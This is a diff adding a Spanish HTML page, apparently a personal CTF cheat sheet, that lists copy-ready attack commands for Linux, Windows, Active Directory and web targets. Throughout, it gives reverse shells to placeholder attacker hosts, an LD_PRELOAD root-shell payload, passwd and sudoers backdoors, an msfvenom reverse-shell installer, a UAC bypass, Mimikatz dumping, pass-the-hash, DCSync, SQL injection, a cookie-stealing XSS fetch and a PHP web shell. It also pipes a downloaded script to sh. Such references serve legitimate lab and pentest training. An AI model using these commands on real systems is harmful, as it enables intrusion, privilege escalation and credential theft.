@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>juanicerouno // cheatsheets</title>
+<style>
+  :root{
+    --bg:#060a0f; --panel:#0b131b; --border:#16222c;
+    --fg:#cdeaf0; --dim:#5f7e87; --cyan:#4df3ff; --magenta:#ff4dd8;
+    --mono:'JetBrains Mono','Courier New',monospace;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:var(--mono); line-height:1.5;
+    background-image:
+      linear-gradient(rgba(77,243,255,.025) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(77,243,255,.025) 1px, transparent 1px);
+    background-size: 32px 32px;
+  }
+  header{
+    padding:28px 20px 18px; text-align:center;
+    border-bottom:1px solid var(--border);
+  }
+  header h1{
+    margin:0; font-size:1.4rem; letter-spacing:.04em;
+    color:var(--cyan); text-shadow:0 0 14px rgba(77,243,255,.35);
+  }
+  header h1 span{color:var(--magenta); text-shadow:0 0 14px rgba(255,77,216,.35);}
+  header p{margin:6px 0 0; color:var(--dim); font-size:.85rem;}
+
+  .search-wrap{max-width:720px; margin:22px auto 0; padding:0 20px;}
+  #q{
+    width:100%; padding:12px 14px; background:var(--panel);
+    border:1px solid var(--border); color:var(--fg); font-family:var(--mono);
+    font-size:.95rem; border-radius:4px; outline:none;
+  }
+  #q:focus{border-color:var(--cyan); box-shadow:0 0 0 1px var(--cyan);}
+  #q::placeholder{color:var(--dim);}
+
+  nav{
+    max-width:900px; margin:16px auto 0; padding:0 20px;
+    display:flex; gap:10px; flex-wrap:wrap; justify-content:center;
+  }
+  nav button{
+    background:none; border:1px solid var(--border); color:var(--dim);
+    font-family:var(--mono); font-size:.78rem; padding:6px 12px;
+    border-radius:3px; cursor:pointer; letter-spacing:.03em;
+  }
+  nav button.active{color:var(--bg); background:var(--cyan); border-color:var(--cyan);}
+
+  main{max-width:900px; margin:24px auto 60px; padding:0 20px;}
+
+  .sheet{margin-bottom:10px;}
+  .sheet-title{
+    font-size:1.05rem; color:var(--magenta); margin:34px 0 4px;
+    border-bottom:1px solid var(--border); padding-bottom:6px;
+  }
+  .sect{
+    border:1px solid var(--border); border-radius:5px; margin:10px 0;
+    background:var(--panel); overflow:hidden;
+  }
+  .sect-head{
+    padding:10px 14px; cursor:pointer; display:flex;
+    justify-content:space-between; align-items:center; gap:10px;
+    user-select:none;
+  }
+  .sect-head h3{margin:0; font-size:.92rem; color:var(--cyan); font-weight:600;}
+  .sect-head .car{color:var(--dim); font-size:.8rem; transition:transform .15s;}
+  .sect.open .car{transform:rotate(90deg);}
+  .sect-body{display:none; padding:0 14px 14px;}
+  .sect.open .sect-body{display:block;}
+
+  .block{margin:12px 0;}
+  .block p{margin:0 0 6px; color:var(--dim); font-size:.82rem;}
+  pre{
+    margin:0; background:#020507; border:1px solid var(--border);
+    border-radius:4px; padding:10px 12px; overflow-x:auto;
+    font-size:.82rem; position:relative;
+  }
+  pre code{color:var(--fg); white-space:pre;}
+  .copy-btn{
+    position:absolute; top:6px; right:6px; background:var(--border);
+    color:var(--dim); border:none; font-family:var(--mono); font-size:.68rem;
+    padding:3px 7px; border-radius:3px; cursor:pointer;
+  }
+  .copy-btn:hover{color:var(--cyan);}
+  .copy-btn.done{color:var(--cyan); border:1px solid var(--cyan);}
+
+  mark{background:rgba(255,77,216,.3); color:#fff; border-radius:2px;}
+  .empty{text-align:center; color:var(--dim); margin-top:60px; font-size:.9rem;}
+  footer{text-align:center; color:var(--dim); font-size:.72rem; padding:20px; border-top:1px solid var(--border);}
+  footer a{color:var(--cyan); text-decoration:none;}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>juani<span>@</span>cheatsheets</h1>
+  <p>comandos de referencia — escalado de privilegios &amp; captura de flags</p>
+</header>
+
+<div class="search-wrap">
+  <input id="q" type="text" placeholder="buscar comando, técnica, binario... (ej: sudo, SUID, JuicyPotato)">
+</div>
+
+<nav id="filters"></nav>
+
+<main id="main"></main>
+
+<footer>github.com/Juanizxcvbn · generado para consulta rápida offline</footer>
+
+<script>
+const DATA = [
+  {
+    id:"linux", title:"🐧 Linux Privilege Escalation",
+    sections:[
+      {h:"Enumeración inicial", blocks:[
+        {p:"Sistema y kernel", code:`uname -a\ncat /etc/os-release\ncat /proc/version\nhostname`},
+        {p:"Usuario actual y permisos", code:`id\nwhoami\nsudo -l\ncat /etc/passwd | grep -v nologin\ngroups`},
+        {p:"Procesos y servicios", code:`ps aux\nps -ef --forest\nnetstat -tulpn\nss -tulpn`},
+        {p:"Cron jobs", code:`cat /etc/crontab\nls -la /etc/cron.*\ncrontab -l\ncat /var/spool/cron/crontabs/* 2>/dev/null`},
+        {p:"Variables de entorno y PATH", code:`env\necho $PATH\ncat /etc/environment`},
+        {p:"Montajes y particiones", code:`mount\ncat /etc/fstab\nlsblk`},
+        {p:"Scripts automatizados (correr primero)", code:`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n./LinEnum.sh -t\n./lse.sh -l1`}
+      ]},
+      {h:"SUID / SGID", blocks:[
+        {p:"Buscar binarios SUID", code:`find / -perm -4000 -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null`},
+        {p:"Buscar binarios SGID", code:`find / -perm -2000 -type f 2>/dev/null`},
+        {p:"Listar SUID con dueño y permisos legibles", code:`find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null`},
+        {p:"Chequear contra GTFOBins", code:`https://gtfobins.github.io/`},
+        {p:"Explotación genérica (sh con -p)", code:`./binario -exec /bin/sh -p \\; -quit`}
+      ]},
+      {h:"Sudo mal configurado", blocks:[
+        {p:"Ver qué podés correr", code:`sudo -l`},
+        {p:"Shells comunes vía sudo (chequear en GTFOBins)", code:`sudo /bin/sh -p\nsudo vim -c ':!/bin/sh'\nsudo less /etc/passwd    # luego !/bin/sh dentro de less\nsudo find . -exec /bin/sh \\;\nsudo awk 'BEGIN {system("/bin/sh")}'\nsudo python3 -c 'import os; os.system("/bin/sh")'\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\nsudo nmap --interactive   # luego !sh`},
+        {p:"LD_PRELOAD (si sudo lo permite con env_keep)", code:`cat > /tmp/preload.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n    unsetenv("LD_PRELOAD");\n    setresuid(0,0,0);\n    system("/bin/sh -p");\n}\nEOF\ngcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles\nsudo LD_PRELOAD=/tmp/preload.so <comando_permitido>`},
+        {p:"Sudo versión vulnerable (CVE-2019-14287 / CVE-2021-3156 Baron Samedit)", code:`sudo -V\n# CVE-2019-14287: sudo -u#-1 /bin/bash\n# CVE-2021-3156: buscar exploit "sudo heap overflow" en searchsploit`}
+      ]},
+      {h:"Capabilities", blocks:[
+        {p:"Listar binarios con capabilities", code:`getcap -r / 2>/dev/null`},
+        {p:"cap_setuid (python)", code:`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`},
+        {p:"cap_setuid (perl)", code:`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`},
+        {p:"cap_dac_read_search (leer cualquier archivo)", code:`tar -cvf shadow.tar.gz /etc/shadow --absolute-names\n# o con python\npython3 -c 'import ctypes; ctypes.CDLL("libc.so.6").open("/etc/shadow", 0)'`}
+      ]},
+      {h:"Cron jobs vulnerables", blocks:[
+        {p:"Script de cron escribible (corre como root)", code:`ls -la /ruta/al/script_del_cron.sh\necho 'bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1' >> /ruta/al/script_del_cron.sh`},
+        {p:"PATH relativo dentro del cron (hijacking)", code:`cat /etc/crontab   # ver si falta /usr/bin en el PATH del cron\necho '/bin/bash -p' > /ruta/en/path/del/cron/comando_que_llama\nchmod +x /ruta/en/path/del/cron/comando_que_llama`},
+        {p:"Wildcard injection (tar/rsync/chown corriendo con *)", code:`# si root corre: tar czf backup.tar.gz *\ncd /directorio/vigilado\necho '' > "--checkpoint=1"\necho '' > "--checkpoint-action=exec=sh shell.sh"\necho '/bin/bash -p' > shell.sh; chmod +x shell.sh`}
+      ]},
+      {h:"Docker / contenedores", blocks:[
+        {p:"Usuario en grupo docker (equivale a root)", code:`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`},
+        {p:"Dentro de un contenedor: escape si el socket Docker está montado", code:`ls -la /var/run/docker.sock\ndocker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh`},
+        {p:"Chequear si el contenedor corre --privileged", code:`fdisk -l\nmount /dev/sda1 /mnt`}
+      ]},
+      {h:"Permisos de archivos sensibles", blocks:[
+        {p:"/etc/passwd escribible (crear usuario root)", code:`openssl passwd -1 -salt xxx contraseña123\necho 'hacker:$1$xxx$HASHGENERADO:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker`},
+        {p:"/etc/sudoers escribible", code:`echo 'usuario ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers`},
+        {p:"Buscar archivos/directorios escribibles por otros", code:`find / -writable -type d 2>/dev/null | grep -v proc\nfind / -perm -o+w -type f 2>/dev/null | grep -v proc`}
+      ]},
+      {h:"Kernel exploits (último recurso)", blocks:[
+        {p:"⚠️ Riesgoso, puede colgar el sistema", code:`uname -a\nsearchsploit linux kernel <version>\n# Dirty Pipe (CVE-2022-0847), DirtyCow (CVE-2016-5195), overlayfs (CVE-2021-3493)`}
+      ]},
+      {h:"Credenciales expuestas", blocks:[
+        {p:"Buscar passwords en configs", code:`grep -r "password" /etc/ 2>/dev/null\nfind / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "pass" 2>/dev/null\ncat /var/www/html/**/config.php 2>/dev/null`},
+        {p:"Historial de bash", code:`cat ~/.bash_history\ncat /root/.bash_history 2>/dev/null`},
+        {p:"Llaves SSH", code:`find / -name "id_rsa" 2>/dev/null\nfind / -name "authorized_keys" 2>/dev/null\ncat ~/.ssh/id_rsa`},
+        {p:"Credenciales en bases de datos locales", code:`mysql -u root -p\ncat /var/www/html/wp-config.php | grep DB_\nsqlite3 database.db ".tables"`}
+      ]},
+      {h:"Path hijacking", blocks:[
+        {p:"Si un SUID llama binarios sin path completo", code:`strings /ruta/al/binario_suid | grep -v "^/"\necho '/bin/sh' > /tmp/nombre_binario\nchmod +x /tmp/nombre_binario\nexport PATH=/tmp:$PATH`}
+      ]},
+      {h:"NFS no_root_squash", blocks:[
+        {p:"Montar y abusar de un share NFS sin root_squash", code:`showmount -e <IP>\nmkdir /tmp/nfs\nmount -t nfs <IP>:/share /tmp/nfs -o nolock\ncp /bin/bash /tmp/nfs/bash\nchmod +s /tmp/nfs/bash\n/share/bash -p`}
+      ]}
+    ]
+  },
+  {
+    id:"windows", title:"🪟 Windows Privilege Escalation",
+    sections:[
+      {h:"Enumeración inicial", blocks:[
+        {p:"Sistema y versión", code:`systeminfo\nhostname\nwhoami /all`},
+        {p:"PowerShell", code:`Get-ComputerInfo\n[System.Environment]::OSVersion.Version`},
+        {p:"Usuario, privilegios y grupos", code:`whoami\nwhoami /priv\nwhoami /groups\nnet user %username%`},
+        {p:"Usuarios y grupos del sistema", code:`net user\nnet localgroup\nnet localgroup administrators`},
+        {p:"Procesos y servicios", code:`tasklist /v\nsc query\nwmic process list full`},
+        {p:"Scripts automatizados", code:`.\\winPEASx64.exe\n\npowershell -ep bypass\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks`}
+      ]},
+      {h:"Privilegios de token", blocks:[
+        {p:"SeImpersonate / SeAssignPrimaryToken → Potato exploits", code:`JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t * -c {CLSID}\nPrintSpoofer.exe -i -c cmd\nRoguePotato.exe -r <IP_atacante> -e "cmd.exe" -l 9999\nGodPotato.exe -cmd "cmd /c whoami"`},
+        {p:"SeBackup / SeRestore → copiar SAM/SYSTEM", code:`reg save hklm\\sam C:\\temp\\sam.save\nreg save hklm\\system C:\\temp\\system.save\nreg save hklm\\security C:\\temp\\security.save`},
+        {p:"SeTakeOwnership", code:`takeown /f C:\\Windows\\System32\\config\\SAM\nicacls C:\\Windows\\System32\\config\\SAM /grant %username%:F`}
+      ]},
+      {h:"Servicios mal configurados", blocks:[
+        {p:"Permisos de servicio", code:`accesschk.exe -uwcqv "Authenticated Users" * /accepteula\nsc qc <nombre_servicio>`},
+        {p:"Unquoted Service Path", code:`wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """\ncopy payload.exe "C:\\Program Files\\Mi.exe"\nsc stop <servicio>\nsc start <servicio>`},
+        {p:"Reemplazar binario del servicio", code:`icacls "C:\\ruta\\servicio.exe"\ncopy payload.exe "C:\\ruta\\servicio.exe"\nsc stop <servicio>\nsc start <servicio>`}
+      ]},
+      {h:"Permisos de archivos y registro", blocks:[
+        {p:"AlwaysInstallElevated", code:`reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PUERTO> -f msi -o malicious.msi\nmsiexec /quiet /qn /i malicious.msi`},
+        {p:"Tareas programadas", code:`schtasks /query /fo LIST /v`}
+      ]},
+      {h:"Credenciales expuestas", blocks:[
+        {p:"Buscar passwords en archivos", code:`findstr /si password *.txt *.ini *.config *.xml\ndir /s *pass* == *cred* == *vnc* == *.config*`},
+        {p:"Credenciales en registro", code:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"\nreg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s`},
+        {p:"SAM/SYSTEM locales", code:`copy C:\\Windows\\System32\\config\\SAM C:\\temp\\\ncopy C:\\Windows\\System32\\config\\SYSTEM C:\\temp\\`},
+        {p:"Historial de PowerShell", code:`type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`},
+        {p:"Credential Manager", code:`cmdkey /list\nvaultcmd /listcreds:"Windows Credentials"`}
+      ]},
+      {h:"Kernel exploits (último recurso)", blocks:[
+        {p:"⚠️ Riesgoso", code:`systeminfo\n.\\Watson.exe\n# Buscar con Windows-Exploit-Suggester según versión/parches`}
+      ]},
+      {h:"Startup / Autoruns / Persistencia explotable", blocks:[
+        {p:"Programas en el Startup folder (si son escribibles)", code:`dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"\ndir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"`},
+        {p:"Claves de registro Run/RunOnce", code:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"\nreg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"`},
+        {p:"accesschk sobre esas claves/carpetas para ver si son escribibles", code:`accesschk.exe -wvu "C:\\ruta\\autorun" /accepteula`}
+      ]},
+      {h:"UAC Bypass", blocks:[
+        {p:"Chequear nivel de UAC", code:`reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin`},
+        {p:"fodhelper.exe bypass (si el usuario es admin local, sin prompt)", code:`reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "C:\\payload.exe" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f\nfodhelper.exe`}
+      ]},
+      {h:"Pass-the-Hash / Dumping de credenciales", blocks:[
+        {p:"Mimikatz — dump de hashes/tickets en memoria (requiere admin)", code:`mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam`},
+        {p:"Pass-the-Hash con hash NTLM obtenido", code:`pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> //<IP> cmd.exe\nevil-winrm -i <IP> -u administrator -H <NTLM_HASH>`}
+      ]}
+    ]
+  },
+  {
+    id:"ad", title:"🏰 Active Directory",
+    sections:[
+      {h:"Enumeración", blocks:[
+        {p:"BloodHound (recolección)", code:`SharpHound.exe -c All\n# o en Linux\nbloodhound-python -u <user> -p <pass> -ns <IP_DC> -d <dominio> -c All`},
+        {p:"PowerView — básico", code:`Import-Module .\\PowerView.ps1\nGet-DomainUser\nGet-DomainComputer\nGet-DomainGroupMember "Domain Admins"`},
+        {p:"Enumeración por línea de comandos nativa", code:`net user /domain\nnet group "Domain Admins" /domain\nnslookup -type=srv _ldap._tcp.dc._msdcs.<dominio>`}
+      ]},
+      {h:"LLMNR/NBT-NS Poisoning", blocks:[
+        {p:"Responder — capturar hashes NTLMv2 en la red", code:`responder -I eth0 -wrf`},
+        {p:"Crackear el hash capturado", code:`hashcat -m 5600 hash.txt rockyou.txt`}
+      ]},
+      {h:"Kerberoasting", blocks:[
+        {p:"Pedir TGS de cuentas de servicio y crackear offline", code:`GetUserSPNs.py <dominio>/<usuario>:<pass> -dc-ip <IP_DC> -request\nhashcat -m 13100 tgs_hashes.txt rockyou.txt`}
+      ]},
+      {h:"AS-REP Roasting", blocks:[
+        {p:"Usuarios sin preauth Kerberos", code:`GetNPUsers.py <dominio>/ -usersfile usuarios.txt -dc-ip <IP_DC> -no-pass\nhashcat -m 18200 asrep_hashes.txt rockyou.txt`}
+      ]},
+      {h:"GPP Passwords (cpassword)", blocks:[
+        {p:"Buscar contraseñas en SYSVOL (Group Policy Preferences)", code:`findstr /S /I cpassword \\\\<dominio>\\sysvol\\<dominio>\\policies\\*.xml\n# Desencriptar con gpp-decrypt (Linux)\ngpp-decrypt <cpassword_encriptado>`}
+      ]},
+      {h:"Pass-the-Ticket / Delegación", blocks:[
+        {p:"Exportar e inyectar tickets Kerberos (Mimikatz)", code:`mimikatz.exe\nsekurlsa::tickets /export\nkerberos::ptt ticket.kirbi`},
+        {p:"Constrained/Unconstrained Delegation (abuso con Rubeus)", code:`Rubeus.exe monitor /interval:5 /nowrap\nRubeus.exe s4u /user:<cuenta> /rc4:<hash> /impersonateuser:administrator /msdsspn:<SPN> /ptt`}
+      ]},
+      {h:"DCSync", blocks:[
+        {p:"Si la cuenta tiene permisos de replicación (Replicating Directory Changes)", code:`mimikatz.exe\nlsadump::dcsync /domain:<dominio> /user:Administrator`},
+        {p:"Con secretsdump.py (Linux)", code:`secretsdump.py <dominio>/<usuario>:<pass>@<IP_DC>`}
+      ]}
+    ]
+  },
+  {
+    id:"web", title:"🌐 Web Exploitation",
+    sections:[
+      {h:"SQL Injection", blocks:[
+        {p:"Detección manual básica", code:`' OR '1'='1\n' OR '1'='1' -- -\n' UNION SELECT NULL,NULL,NULL-- -`},
+        {p:"sqlmap — automatizado", code:`sqlmap -u "http://target/page?id=1" --dbs\nsqlmap -u "http://target/page?id=1" -D nombre_db --tables\nsqlmap -u "http://target/page?id=1" --os-shell`}
+      ]},
+      {h:"Cross-Site Scripting (XSS)", blocks:[
+        {p:"Payloads de prueba", code:`<scr` + `ipt>alert(document.domain)</scr` + `ipt>\n<img src=x onerror=alert(1)>\n"><svg onload=alert(1)>`},
+        {p:"Robo de cookies (XSS almacenado)", code:`<scr` + `ipt>fetch('http://<IP_atacante>/?c='+document.cookie)</scr` + `ipt>`}
+      ]},
+      {h:"Local / Remote File Inclusion", blocks:[
+        {p:"LFI básico", code:`http://target/page.php?file=../../../../etc/passwd\nphp://filter/convert.base64-encode/resource=index.php`},
+        {p:"LFI a RCE vía log poisoning", code:`# Inyectar PHP en el User-Agent y luego incluir el log\nphp://filter/convert.base64-encode/resource=/var/log/apache2/access.log`}
+      ]},
+      {h:"File Upload Bypass", blocks:[
+        {p:"Extensiones alternativas / doble extensión", code:`shell.pHp\nshell.php.jpg\nshell.php%00.jpg\nshell.phtml`},
+        {p:"Magic bytes para pasar validación de tipo de imagen", code:`GIF89a;\n<?php system($_GET['cmd']); ?>`}
+      ]},
+      {h:"Command Injection", blocks:[
+        {p:"Encadenar comandos", code:`; whoami\n| whoami\n&& whoami\n\`whoami\`\n$(whoami)`}
+      ]},
+      {h:"SSRF", blocks:[
+        {p:"Payloads típicos (acceder a metadata/internos)", code:`http://127.0.0.1/\nhttp://169.254.169.254/latest/meta-data/\nhttp://localhost:<puerto_interno>/`}
+      ]}
+    ]
+  },
+  {
+    id:"flags", title:"🚩 Buscar Flags (HTB / THM)", 
+    sections:[
+      {h:"Ubicaciones típicas", blocks:[
+        {p:"Linux", code:`cat /home/*/user.txt\ncat /root/root.txt`},
+        {p:"Windows", code:`type C:\\Users\\*\\Desktop\\user.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt`}
+      ]},
+      {h:"Búsqueda por nombre", blocks:[
+        {p:"Linux", code:`find / -iname "*flag*" 2>/dev/null\nfind / -iname "*.txt" 2>/dev/null | grep -iE "user|root|flag"`},
+        {p:"Windows", code:`dir /s /b C:\\*flag*\ndir /s /b C:\\*user.txt*\n\nGet-ChildItem -Path C:\\ -Include *flag*,*user.txt*,*root.txt* -Recurse -ErrorAction SilentlyContinue`}
+      ]},
+      {h:"Por patrón de contenido (hash/UUID)", blocks:[
+        {p:"Linux", code:`grep -rE "[a-f0-9]{32}" / 2>/dev/null | grep -v "Binary file"\nfind / -type f -name "*.txt" -exec grep -lE "^[a-f0-9]{32}$" {} \\; 2>/dev/null`},
+        {p:"Windows (PowerShell)", code:`Select-String -Path C:\\Users\\*\\Desktop\\*.txt -Pattern "[a-f0-9]{32}"\nGet-ChildItem -Recurse -Include *.txt | Select-String -Pattern "[a-f0-9]{32}"`}
+      ]},
+      {h:"Flags ocultas", blocks:[
+        {p:"Permisos restringidos / rutas no estándar", code:`ls -la /root/\nls -la /home/*/\nfind / -iname "*.txt" 2>/dev/null\nfind / -type f -newermt "2024-01-01" 2>/dev/null | grep -v proc`}
+      ]},
+      {h:"Sherlocks / forense", blocks:[
+        {p:"Logs, DB, capturas", code:`grep -riE "flag\\{|FLAG\\{|HTB\\{" / 2>/dev/null\nfind / -iname "*.pcap" -o -iname "*.log" -o -iname "*.db" 2>/dev/null\ntshark -r archivo.pcap -Y "frame contains \\"flag\\""`}
+      ]}
+    ]
+  }
+];
+
+const main = document.getElementById('main');
+const filters = document.getElementById('filters');
+const q = document.getElementById('q');
+
+function esc(s){return s.replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+function hl(s, term){
+  if(!term) return esc(s);
+  const re = new RegExp('('+term.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','ig');
+  return esc(s).replace(re, '<mark>$1</mark>');
+}
+
+let activeSheet = 'all';
+
+filters.innerHTML = '<button data-id="all" class="active">todos</button>' +
+  DATA.map(s=>`<button data-id="${s.id}">${s.title.replace(/^\S+\s/,'')}</button>`).join('');
+
+filters.addEventListener('click', e=>{
+  if(e.target.tagName!=='BUTTON') return;
+  activeSheet = e.target.dataset.id;
+  [...filters.children].forEach(b=>b.classList.toggle('active', b===e.target));
+  render();
+});
+
+function render(){
+  const term = q.value.trim();
+  const sheets = DATA.filter(s => activeSheet==='all' || s.id===activeSheet);
+  let html = '';
+  let any = false;
+
+  sheets.forEach(sheet=>{
+    const secs = sheet.sections.map(sec=>{
+      const blocks = sec.blocks.filter(b=>{
+        if(!term) return true;
+        return (sec.h+' '+b.p+' '+b.code).toLowerCase().includes(term.toLowerCase());
+      });
+      if(!blocks.length) return '';
+      return {sec, blocks};
+    }).filter(Boolean);
+
+    if(!secs.length) return;
+    any = true;
+    html += `<div class="sheet"><div class="sheet-title">${sheet.title}</div>`;
+    secs.forEach(({sec, blocks})=>{
+      const openCls = term ? ' open' : '';
+      html += `<div class="sect${openCls}"><div class="sect-head" onclick="this.parentElement.classList.toggle('open')">
+        <h3>${hl(sec.h, term)}</h3><span class="car">▶</span></div><div class="sect-body">`;
+      blocks.forEach(b=>{
+        html += `<div class="block"><p>${hl(b.p, term)}</p>
+          <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code>${hl(b.code, term)}</code></pre></div>`;
+      });
+      html += `</div></div>`;
+    });
+    html += `</div>`;
+  });
+
+  main.innerHTML = any ? html : '<p class="empty">sin resultados — probá otro término</p>';
+}
+
+function copyCode(btn){
+  const code = btn.nextElementSibling.innerText;
+  navigator.clipboard.writeText(code).then(()=>{
+    btn.textContent = '✓'; btn.classList.add('done');
+    setTimeout(()=>{btn.textContent='copy'; btn.classList.remove('done');}, 1200);
+  });
+}
+
+q.addEventListener('input', render);
+render();
+</script>
+</body>
+</html>
